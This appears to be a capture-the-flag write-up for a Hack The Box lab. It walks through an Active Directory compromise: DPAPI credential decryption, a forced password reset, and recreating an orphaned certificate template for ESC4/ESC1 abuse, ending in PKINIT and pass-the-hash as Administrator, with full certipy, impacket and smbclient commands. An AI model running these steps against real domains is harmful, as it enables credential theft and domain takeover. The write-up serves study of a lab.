# HTB DanglingTree --- Exploitation Writeup

## Objective

This writeup documents the exploitation chain for **DanglingTree**,
focusing only on the techniques used to progress from the initial
foothold to compromising `Administrator`.

The overall chain is:

``` text
anderson.w
    ↓
Windows Admin Center
    ↓
SmarterMail / svc_mail
    ↓
noah.b
    ↓
DPAPI / Credential Manager
    ↓
alex.o
    ↓
ForceChangePassword
    ↓
jake.h
    ↓
AD CS
    ↓
Administrator
```

> All commands use `<DC>` as a placeholder for the Domain Controller.
> Replace it with the address assigned to your instance.



## 1. Windows Admin Center

After recovering the credentials for `anderson.w`, we can authenticate
to Windows Admin Center.

``` bash
python3 wac_rce.py 'anderson.w' '<ANDERSON_PASSWORD>' 'whoami'
```

A successful execution returns:

``` text
danglingtree\anderson.w
```

The script reproduces WAC's authentication mechanism and then uses
WinREST/PowerShell to execute commands.

The relevant endpoint is:

``` text
/api/services/WinREST/PowerShell/nodes/dc/invokeCommand
```

This gives us command execution in the context of the authenticated
user.



## 2. SmarterMail → svc_mail

The next target is the internal **SmarterMail** application.

The exploitation chain uses:

``` text
CVE-2026-23760
```

to achieve code execution as:

``` text
svc_mail
```

From this context, historical SmarterMail data and backups can be
accessed.

One of the historical backups contains information that allows us to
recover the credentials for:

``` text
noah.b
```

SmarterMail also exposes administrative functionality related to:

``` text
CanViewPasswords
```

and the endpoint:

``` text
/api/v1/settings/domain/show-password/
```

Once Noah's password has been recovered, we can continue the chain using
the domain account.



## 3. noah.b and Credential Manager

After authenticating as `noah.b`, the user's profile contains a
credential stored through **Windows Credential Manager**.

The protected credential belongs to:

``` text
alex.o
```

Credential Manager protects this type of secret using **DPAPI (Data
Protection API)**.

Finding the credential blob alone is therefore not enough. We need:

``` text
Credential Blob
      +
DPAPI Masterkey
      +
Material required to decrypt the Masterkey
```

After recovering and decrypting the correct masterkey, the credential
blob can be decrypted with Impacket:

``` bash
impacket-dpapi credential \
  -file <CREDENTIAL_BLOB> \
  -key 0x<DPAPI_MASTERKEY>
```

The result reveals a domain credential:

``` text
[CREDENTIAL]

Type     : CRED_TYPE_DOMAIN_PASSWORD
Target   : Domain:target=<HOST>
Username : alex.o
Password : <ALEX_PASSWORD>
```

Verify the credentials:

``` bash
nxc smb <DC> \
  -u 'alex.o' \
  -p '<ALEX_PASSWORD>'
```



## 4. alex.o → jake.h via ForceChangePassword

The user `alex.o` has Active Directory rights over the `jake.h` object
that allow a **ForceChangePassword** operation.

This is important because we do not need to know Jake's current
password.

Set a new password:

``` bash
net rpc password 'jake.h' '<NEW_PASSWORD>' \
  -U 'danglingtree.htb/alex.o%<ALEX_PASSWORD>' \
  -S <DC>
```

Verify it:

``` bash
nxc smb <DC> \
  -u 'jake.h' \
  -p '<NEW_PASSWORD>'
```

A successful result confirms control of `jake.h`.



## 5. Enumerating jake.h's PKI Groups

Query Jake's group memberships over LDAPS:

``` bash
LDAPTLS_REQCERT=never ldapsearch -x \
  -H ldaps://<DC>:636 \
  -D 'jake.h@danglingtree.htb' \
  -w '<JAKE_PASSWORD>' \
  -b 'DC=danglingtree,DC=htb' \
  '(&(objectClass=user)(sAMAccountName=jake.h))' \
  memberOf
```
```
┌──(myenv)(z0n㉿0x0z0n)-[~/z0n/z0n/posts/DanglingTree]
└─$ LDAPTLS_REQCERT=never ldapsearch -x \
  -H ldaps://10.129.28.174:636 \
  -D 'jake.h@danglingtree.htb' \
  -w 'Passw0rd123!' \
  -b 'DC=danglingtree,DC=htb' \
  '(&(objectClass=user)(sAMAccountName=jake.h))' \
  memberOf
# extended LDIF
#
# LDAPv3
# base <DC=danglingtree,DC=htb> with scope subtree
# filter: (&(objectClass=user)(sAMAccountName=jake.h))
# requesting: memberOf 
#

# jake.h, Users, danglingtree.htb
dn: CN=jake.h,CN=Users,DC=danglingtree,DC=htb
memberOf: CN=DevOps_PKI,CN=Users,DC=danglingtree,DC=htb
memberOf: CN=Template_Editors,CN=Users,DC=danglingtree,DC=htb
memberOf: CN=Helpdesk_Cert_Support,CN=Users,DC=danglingtree,DC=htb

# search reference
ref: ldaps://ForestDnsZones.danglingtree.htb/DC=ForestDnsZones,DC=danglingtree
 ,DC=htb

# search reference
ref: ldaps://DomainDnsZones.danglingtree.htb/DC=DomainDnsZones,DC=danglingtree
 ,DC=htb

# search reference
ref: ldaps://danglingtree.htb/CN=Configuration,DC=danglingtree,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

Three groups are especially relevant:

``` text
DevOps_PKI
Template_Editors
Helpdesk_Cert_Support
```

These memberships provide the capabilities needed to manipulate
different parts of **Active Directory Certificate Services (AD CS)**.

Certipy also identifies dangerous permissions on the CA:

``` text
ESC7 : User has dangerous permissions.
```



## 6. Discovering Orphaned Certificate Templates

Enumerate the templates published by the Certification Authority:

``` bash
LDAPTLS_REQCERT=never ldapsearch -x \
  -H ldaps://<DC>:636 \
  -D 'jake.h@danglingtree.htb' \
  -w '<JAKE_PASSWORD>' \
  -b 'CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' \
  '(objectClass=pKIEnrollmentService)' \
  cn dNSHostName certificateTemplates
```

```
└─$ LDAPTLS_REQCERT=never ldapsearch -x \
  -H ldaps://10.129.28.174:636 \
  -D 'jake.h@danglingtree.htb' \
  -w 'Passw0rd123!' \
  -b 'CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' \
  '(objectClass=pKIEnrollmentService)' \
  cn dNSHostName certificateTemplates
# extended LDIF
#
# LDAPv3
# base <CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb> with scope subtree
# filter: (objectClass=pKIEnrollmentService)
# requesting: cn dNSHostName certificateTemplates 
#

# danglingtree-DC-CA, Enrollment Services, Public Key Services, Services, Confi
 guration, danglingtree.htb
dn: CN=danglingtree-DC-CA,CN=Enrollment Services,CN=Public Key Services,CN=Ser
 vices,CN=Configuration,DC=danglingtree,DC=htb
cn: danglingtree-DC-CA
dNSHostName: dc.danglingtree.htb
certificateTemplates: RemoteAccessVPN
certificateTemplates: EmployeeAuthTemplate
certificateTemplates: VPNUserTemplate
certificateTemplates: DirectoryEmailReplication
certificateTemplates: DomainControllerAuthentication
certificateTemplates: KerberosAuthentication
certificateTemplates: EFSRecovery
certificateTemplates: EFS
certificateTemplates: DomainController
certificateTemplates: WebServer
certificateTemplates: Machine
certificateTemplates: User
certificateTemplates: SubCA
certificateTemplates: Administrator

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

```
LDAPTLS_REQCERT=never ldapsearch -x \
  -H ldaps://10.129.28.174:636 \
  -D 'jake.h@danglingtree.htb' \
  -w 'Passw0rd123!' \
  -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' \
  '(cn=RemoteAccessVPN)'
# extended LDIF
#
# LDAPv3
# base <CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb> with scope subtree
# filter: (cn=RemoteAccessVPN)
# requesting: ALL
#

# search result
search: 2
result: 0 Success

# numResponses: 1
```
```

LDAPTLS_REQCERT=never ldapsearch -x \
  -H ldaps://10.129.28.174:636 \
  -D 'jake.h@danglingtree.htb' \
  -w 'Passw0rd123!' \
  -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' \
  '(|(cn=RemoteAccessVPN)(cn=EmployeeAuthTemplate)(cn=VPNUserTemplate))'
# extended LDIF
#
# LDAPv3
# base <CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb> with scope subtree
# filter: (|(cn=RemoteAccessVPN)(cn=EmployeeAuthTemplate)(cn=VPNUserTemplate))
# requesting: ALL
#

# search result
search: 2
result: 0 Success

# numResponses: 1
```

```
┌──(myenv)(z0n㉿0x0z0n)-[~/z0n/z0n/posts/DanglingTree]
└─$ LDAPTLS_REQCERT=never ldapsearch -x \
  -H ldaps://10.129.28.174:636 \
  -D 'jake.h@danglingtree.htb' \
  -w 'Passw0rd123!' \
  -b 'DC=danglingtree,DC=htb' \
  '(&(objectClass=user)(sAMAccountName=jake.h))' \
  memberOf
# extended LDIF
#
# LDAPv3
# base <DC=danglingtree,DC=htb> with scope subtree
# filter: (&(objectClass=user)(sAMAccountName=jake.h))
# requesting: memberOf 
#

# jake.h, Users, danglingtree.htb
dn: CN=jake.h,CN=Users,DC=danglingtree,DC=htb
memberOf: CN=DevOps_PKI,CN=Users,DC=danglingtree,DC=htb
memberOf: CN=Template_Editors,CN=Users,DC=danglingtree,DC=htb
memberOf: CN=Helpdesk_Cert_Support,CN=Users,DC=danglingtree,DC=htb

# search reference
ref: ldaps://ForestDnsZones.danglingtree.htb/DC=ForestDnsZones,DC=danglingtree
 ,DC=htb

# search reference
ref: ldaps://DomainDnsZones.danglingtree.htb/DC=DomainDnsZones,DC=danglingtree
 ,DC=htb

# search reference
ref: ldaps://danglingtree.htb/CN=Configuration,DC=danglingtree,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

The CA publishes three interesting template names:

``` text
RemoteAccessVPN
EmployeeAuthTemplate
VPNUserTemplate
```

However, searching for the corresponding objects under:

``` text
CN=Certificate Templates,
CN=Public Key Services,
CN=Services,
CN=Configuration,
DC=danglingtree,
DC=htb
```

returns no matching objects.

In other words, these are **orphaned template references**: the CA still
publishes the names, but their Active Directory template objects no
longer exist.

``` text
CA
 │
 ├── RemoteAccessVPN ──────► AD object missing
 ├── EmployeeAuthTemplate ─► AD object missing
 └── VPNUserTemplate ──────► AD object missing
```

This makes it possible to recreate one of the missing objects.

We use:

``` text
RemoteAccessVPN
```



## 7. Creating an Enterprise OID

Certificate templates require a unique OID.

Enterprise OID objects are stored under:

``` text
CN=OID,
CN=Public Key Services,
CN=Services,
CN=Configuration,
DC=danglingtree,
DC=htb
```

Permissions inherited through:

``` text
DevOps_PKI
```

allow Jake to create a new one.

First determine the environment's Enterprise OID base, then generate
random components to avoid collisions:

``` bash
A=$(python3 -c 'import random; print(random.randint(1000000,9999999))')
B=$(python3 -c 'import random; print(random.randint(1000000,9999999))')
HEX=$(openssl rand -hex 16 | tr '[:lower:]' '[:upper:]')

OID_CN="${B}.${HEX}"
NEW_OID="${BASEOID}.${A}.${B}"
```

Create an LDIF such as:

``` text
dn: CN=<OID_CN>,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb
changetype: add
objectClass: top
objectClass: msPKI-Enterprise-Oid
cn: <OID_CN>
displayName: RemoteAccessVPN
flags: 1
msPKI-Cert-Template-OID: <NEW_OID>
```

```
└─$ LDAPTLS_REQCERT=never ldapsearch -x \                                                                                                                                                                                                                                                                                                                                  
  -H ldaps://10.129.28.174:636 \                                                                                                                                                                                                                                                                                                                                           
  -D 'jake.h@danglingtree.htb' \                                                                                                                                                                                                                                                                                                                                           
  -w 'Passw0rd123!' \                                                                                                                                                                                                                                                                                                                                                      
  -b 'CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' \                                                                                                                                                                                                                                                                                 
  '(objectClass=msPKI-Enterprise-Oid)' \                                                                                                                                                                                                                                                                                                                                   
  msPKI-Cert-Template-OID displayName                                                                                                                                                                                                                                                                                                                                      
# extended LDIF                                                                                                                                                                                                                                                                                                                                                            
#                                                                                                                                                                                                                                                                                                                                                                          
# LDAPv3                                                                                                                                                                                                                                                                                                                                                                   
# base <CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb> with scope subtree                                                                                                                                                                                                                                                              
# filter: (objectClass=msPKI-Enterprise-Oid)                                                                                                                                                                                                                                                                                                                               
# requesting: msPKI-Cert-Template-OID displayName                                                                                                                                                                                                                                                                                                                          
#                                                                                                                                                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                                                                                                                                                           
# OID, Public Key Services, Services, Configuration, danglingtree.htb                                                                                                                                                                                                                                                                                                      
dn: CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree                                                                                                                                                                                                                                                                                             
 ,DC=htb                                                                                                                                                                                                                                                                                                                                                                   
msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.13218431.14779392.10764427.12370                                                                                                                                                                                                                                                                                             
 424.10671376.174                                                                                                                                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                                                                                                                                                           
# 25.7029C3D0A25F3A51247F2CBF8F69D8CD, OID, Public Key Services, Services, Conf                                                                                                                                                                                                                                                                                            
 iguration, danglingtree.htb                                                                                                                                                                                                                                                                                                                                               
dn: CN=25.7029C3D0A25F3A51247F2CBF8F69D8CD,CN=OID,CN=Public Key Services,CN=Se                                                                                                                                                                                                                                                                                             
 rvices,CN=Configuration,DC=danglingtree,DC=htb                                                                                                                                                                                                                                                                                                                            
displayName: Cross Certification Authority                                                                                                                                                                                                                                                                                                                                 
msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.13218431.14779392.10764427.12370                                                                                                                                                                                                                                                                                             
 424.10671376.174.1.25                                                                                                                                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                                                                                                                                                           
# 26.A4B7897865B07CEC51195CF841E2CEE0, OID, Public Key Services, Services, Conf                                                                                                                                                                                                                                                                                            
 iguration, danglingtree.htb                                                                                                                                                                                                                                                                                                                                               
dn: CN=26.A4B7897865B07CEC51195CF841E2CEE0,CN=OID,CN=Public Key Services,CN=Se                                                                                                                                                                                                                                                                                             
 rvices,CN=Configuration,DC=danglingtree,DC=htb                                                                                                                                                                                                                                                                                                                            
displayName: CA Exchange                                                                                                                                                                                                                                                                                                                                                   
msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.13218431.14779392.10764427.12370                                                                                                                                                                                                                                                                                             
 424.10671376.174.1.26                                                                                                                                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                                                                                                                                                           
# 27.A415D508E5506D140C431155F140AA68, OID, Public Key Services, Services, Conf                                                                                                                                                                                                                                                                                            
 iguration, danglingtree.htb                                                                                                                                                                                                                                                                                                                                               
dn: CN=27.A415D508E5506D140C431155F140AA68,CN=OID,CN=Public Key Services,CN=Se                                                                                                                                                                                                                                                                                             
 rvices,CN=Configuration,DC=danglingtree,DC=htb                                                                                                                                                                                                                                                                                                                            
displayName: Key Recovery Agent                                                                                                                                                                                                                                                                                                                                            
msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.13218431.14779392.10764427.12370                                                                                                                                                                                                                                                                                             
 424.10671376.174.1.27                                                                                                                                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                                                                                                                                                           
# 28.1605D9EC72C61A042BF7F34A232D3F3C, OID, Public Key Services, Services, Conf                                                                                                                                                                                                                                                                                            
 iguration, danglingtree.htb                                                                                                                                                                                                                                                                                                                                               
dn: CN=28.1605D9EC72C61A042BF7F34A232D3F3C,CN=OID,CN=Public Key Services,CN=Se                                                                                                                                                                                                                                                                                             
 rvices,CN=Configuration,DC=danglingtree,DC=htb                                                                                                                                                                                                                                                                                                                            
displayName: Domain Controller Authentication                                                                                                                                                                                                                                                                                                                              
msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.13218431.14779392.10764427.12370                                                                                                                                                                                                                                                                                             
 424.10671376.174.1.28                                                                                                                                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                                                                                                                                                           
# 29.DED3657DBDFEE6EC25927BA93B96E8EA, OID, Public Key Services, Services, Conf                                                                                                                                                                                                                                                                                            
 iguration, danglingtree.htb                                                                                                                                                                                                                                                                                                                                               
dn: CN=29.DED3657DBDFEE6EC25927BA93B96E8EA,CN=OID,CN=Public Key Services,CN=Se                                                                                                                                                                                                                                                                                             
 rvices,CN=Configuration,DC=danglingtree,DC=htb                                                                                                                                                                                                                                                                                                                            
displayName: Directory Email Replication                                                  
msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.13218431.14779392.10764427.12370
 424.10671376.174.1.29                                                                    

# 30.02A0FB82E13AC0164B6C717752CBA6CA, OID, Public Key Services, Services, Conf
 iguration, danglingtree.htb                                                              
dn: CN=30.02A0FB82E13AC0164B6C717752CBA6CA,CN=OID,CN=Public Key Services,CN=Se
 rvices,CN=Configuration,DC=danglingtree,DC=htb                                           
displayName: Workstation Authentication                                                   
msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.13218431.14779392.10764427.12370
 424.10671376.174.1.30                                                                    

# 31.50E0BEC8C1EB0DDE81379A4A1882230F, OID, Public Key Services, Services, Conf
 iguration, danglingtree.htb                                                              
dn: CN=31.50E0BEC8C1EB0DDE81379A4A1882230F,CN=OID,CN=Public Key Services,CN=Se
 rvices,CN=Configuration,DC=danglingtree,DC=htb                                           
displayName: RAS and IAS Server                                                           
msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.13218431.14779392.10764427.12370
 424.10671376.174.1.31                                                                    

# 32.0055EC42E69288933C63F5ECFD2A99EC, OID, Public Key Services, Services, Conf
 iguration, danglingtree.htb                                                              
dn: CN=32.0055EC42E69288933C63F5ECFD2A99EC,CN=OID,CN=Public Key Services,CN=Se
 rvices,CN=Configuration,DC=danglingtree,DC=htb                                           
displayName: OCSP Response Signing                                                        
msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.13218431.14779392.10764427.12370
 424.10671376.174.1.32                                                                    

# 33.3275F92B6E16D007C574F0C4333AF483, OID, Public Key Services, Services, Conf
 iguration, danglingtree.htb                                                              
dn: CN=33.3275F92B6E16D007C574F0C4333AF483,CN=OID,CN=Public Key Services,CN=Se
 rvices,CN=Configuration,DC=danglingtree,DC=htb                                           
displayName: Kerberos Authentication                                                      
msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.13218431.14779392.10764427.12370
 424.10671376.174.1.33                                             
 # 400.19AED7D26E7C3FBD196604D0B74E63BE, OID, Public Key Services, Services, Con
 figuration, danglingtree.htb                                                             
dn: CN=400.19AED7D26E7C3FBD196604D0B74E63BE,CN=OID,CN=Public Key Services,CN=S
 ervices,CN=Configuration,DC=danglingtree,DC=htb                                          
displayName: Low Assurance                                                                
msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.13218431.14779392.10764427.12370
 424.10671376.174.1.400                                                                   

# 401.3C692277B47E0B960F98DEB7959953D3, OID, Public Key Services, Services, Con
 figuration, danglingtree.htb                                                             
dn: CN=401.3C692277B47E0B960F98DEB7959953D3,CN=OID,CN=Public Key Services,CN=S
 ervices,CN=Configuration,DC=danglingtree,DC=htb                                          
displayName: Medium Assurance                                                             
msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.13218431.14779392.10764427.12370
 424.10671376.174.1.401                                                                   

# 402.7B40621A544618224F96BAF48311B131, OID, Public Key Services, Services, Con
 figuration, danglingtree.htb                                                             
dn: CN=402.7B40621A544618224F96BAF48311B131,CN=OID,CN=Public Key Services,CN=S
 ervices,CN=Configuration,DC=danglingtree,DC=htb                                          
displayName: High Assurance                                                               
msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.13218431.14779392.10764427.12370
 424.10671376.174.1.402                                                                   

# 11258082.87093EDCFF90DCFDC7100FBB79598DC3, OID, Public Key Services, Services
 , Configuration, danglingtree.htb                                                        
dn: CN=11258082.87093EDCFF90DCFDC7100FBB79598DC3,CN=OID,CN=Public Key Services
 ,CN=Services,CN=Configuration,DC=danglingtree,DC=htb                                     
msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.13218431.14779392.10764427.12370
 424.10671376.174.9509235.11258082                                                        

# 14421572.1B6A7EEE85088E3F88F3FF23DBCD22B4, OID, Public Key Services, Services
 , Configuration, danglingtree.htb                                                        
dn: CN=14421572.1B6A7EEE85088E3F88F3FF23DBCD22B4,CN=OID,CN=Public Key Services
 ,CN=Services,CN=Configuration,DC=danglingtree,DC=htb                                     
msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.13218431.14779392.10764427.12370
 424.10671376.174.7869945.14421572                                                        

# 6395086.AAB853B8C61206E5F7864B4DB073ADD6, OID, Public Key Services, Services,
  Configuration, danglingtree.htb                                                         
dn: CN=6395086.AAB853B8C61206E5F7864B4DB073ADD6,CN=OID,CN=Public Key Services,
 CN=Services,CN=Configuration,DC=danglingtree,DC=htb                                      
msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.13218431.14779392.10764427.12370
 424.10671376.174.9911274.6395086                                                         

# search result                                                                           
search: 2                                                                                 
result: 0 Success                                                                         

# numResponses: 17                                                                        
# numEntries: 16      
```

Add the object:

``` bash
LDAPTLS_REQCERT=never ldapadd -x \
  -H ldaps://<DC>:636 \
  -D 'jake.h@danglingtree.htb' \
  -w '<JAKE_PASSWORD>' \
  -f /tmp/oid.ldif
```



## 8. Recreating RemoteAccessVPN

Next, recreate:

``` text
CN=RemoteAccessVPN,
CN=Certificate Templates,
CN=Public Key Services,
CN=Services,
CN=Configuration,
DC=danglingtree,
DC=htb
```

The new object uses the Enterprise OID created in the previous step.

After preparing the template LDIF:

``` bash
LDAPTLS_REQCERT=never ldapadd -x \
  -H ldaps://<DC>:636 \
  -D 'jake.h@danglingtree.htb' \
  -w '<JAKE_PASSWORD>' \
  -f /tmp/template.ldif
```

Enumerate the result:

``` bash
certipy find \
  -u 'jake.h@danglingtree.htb' \
  -p '<JAKE_PASSWORD>' \
  -dc-ip <DC> \
  -stdout
```

The new template should appear similar to:

``` text
Template Name : RemoteAccessVPN
Enabled       : True
Owner         : DANGLINGTREE.HTB\jake.h
```

Certipy identifies:

``` text
ESC4 : Template is owned by user.
```



## 9. ESC4 → FullControl

Being the owner of an AD object does not necessarily mean the account
can directly modify every attribute.

Attempting to immediately rewrite the template may return:

``` text
User 'JAKE.H' doesn't have permission to update these attributes
```

Direct LDAP modifications can similarly fail with:

``` text
INSUFF_ACCESS_RIGHTS
```

The important detail is that Jake is the **owner** of the template.

The owner can modify its DACL. Grant Jake `FullControl`:

``` bash
impacket-dacledit \
  -action write \
  -rights FullControl \
  -principal 'jake.h' \
  -target-dn 'CN=RemoteAccessVPN,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' \
  'danglingtree.htb/jake.h:<JAKE_PASSWORD>' \
  -dc-ip <DC> \
  -use-ldaps
```

Expected result:

``` text
DACL modified successfully!
```

Jake now has `FullControl` over the template.



## 10. Converting the Template to ESC1

We now transform `RemoteAccessVPN` into a template that allows a
certificate request to specify another identity.

First obtain Jake's SID:

``` bash
impacket-lookupsid \
  'danglingtree.htb/jake.h:<JAKE_PASSWORD>@<DC>' \
  | grep -i 'jake.h'
```

Then configure the template with Certipy:

``` bash
certipy template \
  -u 'jake.h@danglingtree.htb' \
  -p '<JAKE_PASSWORD>' \
  -dc-ip <DC> \
  -template 'RemoteAccessVPN' \
  -write-default-configuration '<JAKE_SID>' \
  -force
```

A successful update returns:

``` text
Successfully updated 'RemoteAccessVPN'
```

The resulting template contains the properties needed for an
**ESC1-style** abuse path, including:

``` text
Client Authentication
Enrollee Supplies Subject
No Manager Approval
No Authorized Signatures
```

This allows the requester to control the identity placed in the
certificate request.



## 11. Building the Administrator SID

Retrieve the domain SID:

``` bash
impacket-lookupsid \
  'danglingtree.htb/jake.h:<JAKE_PASSWORD>@<DC>' \
  | head
```

It will have the form:

``` text
S-1-5-21-<DOMAIN_IDENTIFIER>
```

The built-in Administrator account has RID:

``` text
500
```

Therefore:

``` text
Administrator SID =
S-1-5-21-<DOMAIN_IDENTIFIER>-500
```



## 12. Requesting an Administrator Certificate

Request a certificate using:

``` text
UPN = Administrator@danglingtree.htb
SID = <ADMINISTRATOR_SID>
```

If the standard RPC enrollment method times out, use **DCOM
Enrollment**:

``` bash
certipy req \
  -u 'jake.h@danglingtree.htb' \
  -p '<JAKE_PASSWORD>' \
  -dc-ip <DC> \
  -target 'dc.danglingtree.htb' \
  -ca 'danglingtree-DC-CA' \
  -template 'RemoteAccessVPN' \
  -upn 'Administrator@danglingtree.htb' \
  -sid '<ADMINISTRATOR_SID>' \
  -dcom
```

A successful request should show an Administrator UPN and the matching
Administrator SID, and save the certificate/private key as:

``` text
administrator.pfx
```

### Important: include the SID

Requesting only:

``` text
-upn Administrator@danglingtree.htb
```

may result in a certificate that later fails PKINIT with:

``` text
Object SID mismatch between certificate and user 'administrator'
```

Use both:

``` text
-upn Administrator@danglingtree.htb
-sid <ADMINISTRATOR_SID>
```



## 13. PKINIT as Administrator

Authenticate using the certificate:

``` bash
certipy auth \
  -pfx administrator.pfx \
  -dc-ip <DC> \
  -domain danglingtree.htb
```

If the clocks are synchronized, Certipy can request a TGT using
**PKINIT**.

A successful execution produces output similar to:

``` text
Got TGT

Saving credential cache to:
administrator.ccache

Got hash for:
administrator@danglingtree.htb
```

At this point, `Administrator` is compromised without knowing the
account's password.



## 14. Troubleshooting: KRB_AP_ERR_SKEW

Kerberos may return:

``` text
KRB_AP_ERR_SKEW
Clock skew too great
```

Kerberos requires the client and KDC clocks to be sufficiently
synchronized.

Check the difference:

``` bash
date
ntpdate -q <DC>
```

If a VM or host time synchronization mechanism keeps restoring the local
clock, an alternative is to fake the time only for the Certipy process.

Install:

``` bash
sudo apt install faketime
```

Then run Certipy with the observed offset:

``` bash
faketime "$(date -d '<CLOCK_OFFSET>' '+%Y-%m-%d %H:%M:%S')" \
  certipy auth \
  -pfx administrator.pfx \
  -dc-ip <DC> \
  -domain danglingtree.htb
```

Replace `<CLOCK_OFFSET>` with the actual difference observed between the
attacking host and the DC.

This avoids permanently modifying the system clock.



## 15. Administrative Access

After successful PKINIT, we normally have:

``` text
administrator.ccache
```

Certipy may also recover the Administrator NT hash.

Using Pass-the-Hash with Samba:

``` bash
smbclient //<DC>/C$ \
  -U 'danglingtree.htb/Administrator%<ADMIN_NT_HASH>' \
  --pw-nt-hash
```

When using:

``` text
--pw-nt-hash
```

provide only the **NT hash**, not an `LM:NT` pair.

Successful access to `C$` confirms administrative control of the Domain
Controller.



## Attack Path

``` text
┌──────────────────────┐
│      anderson.w      │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ Windows Admin Center │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ SmarterMail RCE      │
│      svc_mail        │
└──────────┬───────────┘
           │
           │ historical backup
           ▼
┌──────────────────────┐
│       noah.b         │
└──────────┬───────────┘
           │
           │ Credential Manager
           │ + DPAPI
           ▼
┌──────────────────────┐
│       alex.o         │
└──────────┬───────────┘
           │
           │ ForceChangePassword
           ▼
┌──────────────────────┐
│       jake.h         │
└──────────┬───────────┘
           │
           ├──────── DevOps_PKI
           │              │
           │              ▼
           │       Enterprise OID
           │
           ├──────── Template_Editors
           │              │
           │              ▼
           │       RemoteAccessVPN
           │
           ▼
┌──────────────────────┐
│   Template Owner     │
│        ESC4          │
└──────────┬───────────┘
           │
           │ WriteDACL
           ▼
┌──────────────────────┐
│     FullControl      │
└──────────┬───────────┘
           │
           │ modify template
           ▼
┌──────────────────────┐
│        ESC1          │
└──────────┬───────────┘
           │
           │ Administrator
           │ UPN + SID
           ▼
┌──────────────────────┐
│ Administrator cert   │
└──────────┬───────────┘
           │
           │ PKINIT
           ▼
┌──────────────────────┐
│    Administrator     │
└──────────────────────┘
```



## Key Concepts

### DPAPI

Credential Manager secrets are protected using DPAPI.

The conceptual chain is:

``` text
Credential Blob
      ↓
DPAPI Masterkey
      ↓
Decrypt
      ↓
Domain Credential
```

### ForceChangePassword

Compromising an AD account does not always require recovering its
existing password.

If another controlled principal has the appropriate right:

``` text
alex.o
   │
   │ ForceChangePassword
   ▼
jake.h
```

we can assign a password we know.

### Orphaned Templates

A CA may retain a template name inside `certificateTemplates` even when
the corresponding object no longer exists under
`CN=Certificate Templates`.

``` text
CA publishes RemoteAccessVPN
            │
            ▼
AD object does not exist
            │
            ▼
attacker recreates object
            │
            ▼
CA recognizes template
```

### ESC4

Control over a certificate template can be converted into a more
directly exploitable configuration.

In this case:

``` text
Owner
  ↓
WriteDACL
  ↓
FullControl
  ↓
Modify Template
```

### ESC1

The resulting template allows a requester to supply an arbitrary
identity in a certificate request:

``` text
jake.h
   │
   │ certificate request
   │ UPN = Administrator
   │ SID = Administrator SID
   ▼
Certificate Authority
   │
   ▼
Administrator certificate
```

### PKINIT

Finally:

``` text
Administrator certificate
          │
          ▼
        PKINIT
          │
          ▼
     Kerberos TGT
          │
          ▼
    Administrator
```

The Administrator password is never required.



## Final Exploitation Chain

``` text
anderson.w
    ↓
WAC
    ↓
SmarterMail
    ↓
svc_mail
    ↓
SmarterMail backup
    ↓
noah.b
    ↓
Credential Manager / DPAPI
    ↓
alex.o
    ↓
ForceChangePassword
    ↓
jake.h
    ↓
DevOps_PKI + Template_Editors
    ↓
Enterprise OID
    ↓
Recreate RemoteAccessVPN
    ↓
ESC4
    ↓
WriteDACL / FullControl
    ↓
ESC1
    ↓
Administrator certificate
    ↓
PKINIT
    ↓
Administrator
```

## Conclusion

DanglingTree demonstrates how several individually limited Active
Directory and PKI permissions can be chained into full domain
compromise.

The most interesting part of the final escalation is that the attacker
does not simply discover an already-vulnerable certificate template.
Instead, the vulnerable configuration is effectively constructed by
combining:

``` text
PKI permissions
      +
orphaned CA template reference
      +
template ownership
      +
DACL manipulation
      =
ESC1
```

Once `RemoteAccessVPN` can be configured to accept a requester-supplied
identity, obtaining a certificate for `Administrator` and authenticating
with PKINIT completes the escalation.


# 0. Nmap — Initial Situational Awareness

## 0.1 Objective

The objective of the initial Nmap scan is not simply to collect open ports.

The goal is to answer:

